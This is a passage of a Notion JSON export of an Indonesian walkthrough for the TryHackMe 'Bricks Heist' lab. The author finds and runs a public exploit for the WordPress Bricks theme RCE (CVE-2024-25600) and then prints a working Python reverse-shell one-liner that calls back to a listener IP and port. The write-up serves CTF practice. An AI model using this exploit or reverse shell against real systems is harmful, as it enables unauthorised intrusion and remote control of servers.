+            }
+          ],
+          "language": "python",
+          "caption": []
+        }
+      },
+      {
+        "id": "24adb469-a81d-8014-a455-dee75560203e",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:40:00.000Z",
+        "last_edited_time": "2025-08-09T13:40:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-808a-9f26-d65f6429cf42",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:40:00.000Z",
+        "last_edited_time": "2025-08-09T13:40:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Berdasarkan informasi yang dikumpulkan. Bahwa website target menggunakan CMS Wordpress dengan Theme Bricks. Selain itu pada deskripsi juga kita cukup perlu cari RCE CVE. ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-805e-8dc3-fbd0c68fa918",
+        "type": "heading_2",
+        "created_time": "2025-08-09T13:40:00.000Z",
+        "last_edited_time": "2025-08-09T13:40:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tahap 2",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "24adb469-a81d-8001-a242-ed51cd5bf6f8",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:19:00.000Z",
+        "last_edited_time": "2025-08-09T13:41:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Setelah informasi didapatkan. Saya langsung saja mencari ke google search dengan kata kunci: “wp theme bricks exploit”",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80fc-b100-e5445bb0b6b0",
+        "type": "image",
+        "created_time": "2025-08-09T13:41:00.000Z",
+        "last_edited_time": "2025-08-09T13:41:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-6.png",
+          "expiry_time": "2025-09-18T13:53:33.801Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-6.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/c48edf23-b9be-4de3-92a1-96b3476df1c0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=a42b8d9a4b21961e200d94d589a72e54fa6ab982024ec6ed8c83354a3a7c9543&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-806c-b330-eeb5c621d1c8",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:41:00.000Z",
+        "last_edited_time": "2025-08-09T13:44:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Banyak artikel yang membahas kerentana dari Theme Bricks. Artinya theme tersebut ada celah.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80de-a094-c0aabdbdb5c8",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:44:00.000Z",
+        "last_edited_time": "2025-08-09T13:45:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Saya memilih salah satu artikel berikut:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-807b-96cb-f6147ed70bd1",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:44:00.000Z",
+        "last_edited_time": "2025-08-09T13:44:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "https://pentest-tools.com/vulnerabilities-exploits/unauthenticated-remote-code-execution-bricks-196_22521",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": "https://pentest-tools.com/vulnerabilities-exploits/unauthenticated-remote-code-execution-bricks-196_22521"
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8018-8a49-c74931b47c78",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:45:00.000Z",
+        "last_edited_time": "2025-08-09T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Pada artikel tersebut tingkat kerentanan nya adalah 10. Selain itu juga terdapat referensi untuk bisa dibaca lagi. Dari artikel tersebut saya menemukan tools cve:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80e0-9812-fb69bf143c9e",
+        "type": "link_preview",
+        "created_time": "2025-08-09T13:59:00.000Z",
+        "last_edited_time": "2025-08-09T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "url": "https://github.com/Chocapikk/CVE-2024-25600"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8030-bae7-e13ea4a1af4e",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:59:00.000Z",
+        "last_edited_time": "2025-08-09T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80d5-916e-d4aff3b360ec",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:44:00.000Z",
+        "last_edited_time": "2025-08-09T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Untuk dokumentasinya sudah lengkap di link github tersebut.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80d4-8959-e98f149076d2",
+        "type": "image",
+        "created_time": "2025-08-09T13:59:00.000Z",
+        "last_edited_time": "2025-08-09T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-7.png",
+          "expiry_time": "2025-09-18T13:53:33.991Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-7.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/3d834f3d-26d4-4f5b-83d9-2800adde93a2/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=4d676f261c3ca11efdf8ff5d5e8efddd591ded429bba9b17dc295b2d88b04517&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80cf-b2d4-f0fe5d5285f9",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:59:00.000Z",
+        "last_edited_time": "2025-08-09T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8092-a0d4-d292a0a91a68",
+        "type": "paragraph",
+        "created_time": "2025-08-09T13:19:00.000Z",
+        "last_edited_time": "2025-08-09T14:00:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Oke sekarang coba exploitasi.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-80f4-b2ba-d04602bc96d4",
+        "type": "code",
+        "created_time": "2025-08-09T14:00:00.000Z",
+        "last_edited_time": "2025-08-09T14:01:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "python exploit.py -u https://bricks.thm",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "python",
+          "caption": []
+        }
+      },
+      {
+        "id": "24adb469-a81d-80ab-9f24-cc1070124acb",
+        "type": "image",
+        "created_time": "2025-08-09T14:03:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-8.png",
+          "expiry_time": "2025-09-18T13:53:33.986Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-8.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/f3454a6c-8eb9-4d18-9cd6-3be797600c8c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=c4bd2abbdcf9267a32a9a0445d15fcc10ff275933c3ac4eda48a632b745cb07a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8024-ae2f-d9978dfe0383",
+        "type": "paragraph",
+        "created_time": "2025-08-09T14:05:00.000Z",
+        "last_edited_time": "2025-08-09T14:05:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8039-940e-d78de60f50e6",
+        "type": "paragraph",
+        "created_time": "2025-08-09T14:03:00.000Z",
+        "last_edited_time": "2025-08-09T14:06:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Gotcha, dari info tersebut bahwa website target vuln terhadap CVE. Sekarang saya coba jalankan perintah shell nya.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24adb469-a81d-808d-bc7b-c82975b888f1",
+        "type": "image",
+        "created_time": "2025-08-09T14:06:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-9.png",
+          "expiry_time": "2025-09-18T13:53:33.982Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-9.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/bfcfd69a-96a9-4cd2-90f2-f916d3634eb9/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=a4b599020ae11b38094b6a56f9eb35a8d83f2af964b70caf1027445cfb707f74&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24adb469-a81d-8093-83dd-f5d02f5d383b",
+        "type": "paragraph",
+        "created_time": "2025-08-09T14:06:00.000Z",
+        "last_edited_time": "2025-08-10T02:42:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Yups, berhasil dieksekusi oleh server 😀. Sekarang saya waktunya untuk menjawab sebuah soal.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-807c-8a02-f110247345ea",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:49:00.000Z",
+        "last_edited_time": "2025-08-10T02:51:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Oh iya, bisa bisa leluasa. Saya disini melakukan reverse shell terlebih dahulu. Disini saya menggunakan situs dari revshell generator.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-805e-8471-fcefe9e29d62",
+        "type": "image",
+        "created_time": "2025-08-10T02:51:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-10.png",
+          "expiry_time": "2025-09-18T13:53:33.990Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-10.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/e8961f96-0961-4af1-843b-fcfb27ea88fb/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664NG6MKMV%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125334Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIF65DRob0eolanpyNhguBY%2FLmvn%2BiJ5Bcq5M0Z7Aa1MCAiEAkJZH6e8AM0%2FNyCdtezV3fOP22l%2FQaawj4p6vTjLQYKoqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDKNM7RuF8DZJcf2%2BKircA4tW94vARYZMSpRWJkUmbHaoPouM8OOnGg5d4tOj9EIdRDUMN2Jw8qBlqJqA3Z%2BRS9wxVTAKurp0a8c2CKhOwWORk2I3VANWGvO52f5sJwE%2FJbbdUD5m8W23j%2BJ5vbinKjQBAuMCkwmsO1BdQ%2F7xaVVBR7CwOlhVGHoyj7duGrJ2%2Ff0XFr%2Fu54dDS%2Bb%2BMneDQYxV9xmg1u5BXJrBV6sLu9wrrpUombGkVLJ3uwrbjXZlQTj5PbwPI0mOGMOAGhUCARlR%2B0RX0tTek7rFcwLcHGUBhJ2Wh%2B%2FYoa66O8TfO%2F2rgCV2BHtCpkQnoQm7ruQKEDLDnvcS3DiU%2FAXUVBBxMKGvLxuon9b6ig9D%2F%2Bf415Nx7ezMmHdGlseFENNJwuCDvIuFO323rHTku7hwikBJMHopdsiy60rVvvxTOuYiSFmicbKXrsqPhAPLPM%2BMMHk15irD5ANRoYCioEG%2B9KkYqll6EAQBNzAHAKaHXZS8CdyzZ3yJkaECvZI7f7mdyIXDTkmLi4v%2FJxhVm7IrfbXIfOt7%2BGv58pXn%2FdRxodIr7TRmLM4eCEUI1XKNz%2F71ma%2FLr5cgKMpOxSji6ppUAE9Ytv2f9LkdXoedCKsbNz1Qu1UZFPnMRSpebmhhb20YMKnkr8YGOqUBj6DGGzJ%2FE%2FaImJnYky3T5HxGUeeNgJbC5RuiubkiK%2FqJ84eBJiaI8Lc8d5A5CMtv%2BAXIhSUb%2B120W5WjMLUpJRUa2KyOWO49mBJuypfgGI2V7hlKEpLcUE%2FO4gEviLmJTS1l0Quw8KIUx%2FKKrtAifOFsk62v%2FHguFySCySVVPCqz8J7M8PyvtELMdKMPsoZ7VmbXD2qAc6D7mVvHfrnjEa%2Ba%2B6qp&X-Amz-Signature=0b70fc404db03c7a75cece136e624d1bfb1680df6dc272e3c1eebb6d41db70f0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8079-9d96-cf614b1d58c4",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:51:00.000Z",
+        "last_edited_time": "2025-08-10T02:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Isi IP dan port nya. Untuk IP tersebut adalah ip local yang terhubung dengan openvpn, dan untuk port nya itu bebas. Untuk revshell nya saya pilih menggunakan python #1:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80d0-a6ce-d98cd230b053",
+        "type": "code",
+        "created_time": "2025-08-10T02:52:00.000Z",
+        "last_edited_time": "2025-08-10T02:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.21.234.56\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "python",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c8-8fb5-ed32f4a55b5a",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:52:00.000Z",
+        "last_edited_time": "2025-08-10T02:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80a3-ac93-e4f9181025ac",
+        "type": "paragraph",
+        "created_time": "2025-08-10T02:52:00.000Z",
+        "last_edited_time": "2025-08-10T02:52:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Di terminal, kita aktifkan dulu listerner nya seperti ini:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8008-b8a5-fda757c91a64",
+        "type": "image",
+        "created_time": "2025-08-10T02:53:00.000Z",
+        "last_edited_time": "2025-09-18T09:43:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-11.png",
+          "expiry_time": "2025-09-18T13:53:34.037Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-11.png",
